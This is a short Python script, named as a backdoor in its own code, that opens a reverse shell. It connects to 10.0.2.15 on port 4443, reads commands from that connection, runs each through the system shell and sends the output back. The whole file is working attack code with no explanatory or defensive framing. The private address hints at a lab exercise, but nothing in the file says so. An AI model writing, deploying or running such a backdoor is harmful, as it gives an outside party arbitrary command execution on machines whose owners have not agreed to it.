import socket
import subprocess

connectBackIP = '10.0.2.15'
connectBackPort = 4443

backdoor = socket.socket()
backdoor.connect((connectBackIP, connectBackPort))

while True:
    cmd = backdoor.recv(1024)
    cmd = cmd.decode()
    ops = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    output = ops.stdout.read()
    output_error = ops.stderr.read()
    backdoor.send(output + output_error)
